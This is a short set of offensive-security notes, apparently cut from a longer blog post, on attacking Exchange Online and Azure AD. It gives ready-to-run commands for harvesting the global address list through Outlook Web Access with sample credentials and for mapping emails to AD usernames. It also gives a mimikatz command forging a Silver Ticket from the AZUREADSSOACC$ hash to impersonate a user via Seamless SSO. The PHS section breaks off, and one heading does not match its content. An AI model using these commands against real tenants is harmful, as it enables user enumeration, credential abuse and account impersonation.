# Password Spraying
**By connecting to Outlook Web Access Portal and utilizing the FindPeople method, it is able to gather the list of all email addresses**
```
Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName thureinsoe@insomnia.com -Password 123456%*@aA -OutFile global-address-list.txt

```
# Exchange Service
Connecting to Exchange Service, it is also able to retrieve the Active Directory username corresponding to the given email address
```
Get-ADUsernameFromEWS -EmailList gotham-emails.txt -ExchHostname outlook.office365.com -Remote
```
# Enabling Multi-Factor Authentication Users
The following MSOnline PowerShell command allows Azure AD administrators to list Azure AD users and the state of their MFA configuration
```
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```
# Password Hash Synchronization (PHS)
This attack is not actually targeting Azure AD but exploiting one of its features in order to escalate privileges on the on-premise Active Directory domain it is synchronized with. Remember Password Hash Synchronization? As explained earlier in this post, a synchronisation account is created by Azure AD Connect on the on-premises Active Directory

# Seamless Single Sign-On (SSO)
Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) automatically signs users in when they are on their corporate devices connected to your corporate network. When enabled, users don't need to type in their passwords to sign in to Azure AD. This feature provides your users easy access to your cloud-based applications without needing any additional on-premises components.**When the user wants to connect to Azure AD, the Domain Controller provides him a service ticket for Azure AD. Service tickets are encrypted with the password of a computer account named AZUREADSSOACC$, automatically created when enabling this feature**

In order to do so, the following parameters are required:

* Username of the user to impersonate.
* Domain name.
* NTLM hash of the AZUREADSSOACC$ account.
* SID of the user to impersonate.
* Target service, which is HTTP/aadg.windows.net.nsatc.net.

**Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet Service**
```
kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:db[...]59 /sid:S-1-5-21-805388781-1469664503-1626361301-1106 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
```
